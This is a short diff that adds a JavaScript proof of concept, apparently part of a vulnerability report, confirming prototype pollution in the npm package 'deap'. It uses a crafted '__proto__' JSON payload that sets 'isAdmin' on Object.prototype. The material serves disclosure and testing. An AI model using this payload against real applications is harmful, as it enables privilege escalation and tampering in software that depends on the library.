@@ -1,0 +1,20 @@
+Confirmed the prototype pollution vulnerability in `deap`'s `deepExtend`.
+
+```javascript
+const deap = require("./node_modules/deap");
+
+// Attacker-controlled JSON (e.g. from user input / request body)
+const malicious = JSON.parse('{"__proto__":{"polluted":"yes","isAdmin":true}}');
+
+// deap.extend deep-merges without filtering __proto__/constructor keys,
+// so this pollutes Object.prototype for the whole process.
+deap.extend({}, malicious);
+
+const innocentObject = {};
+console.log("polluted:", innocentObject.polluted);   // "yes"
+console.log("isAdmin:", innocentObject.isAdmin);     // true
+
+if (innocentObject.polluted === "yes") {
+  console.log("Prototype pollution confirmed: Object.prototype was modified");
+}
+```
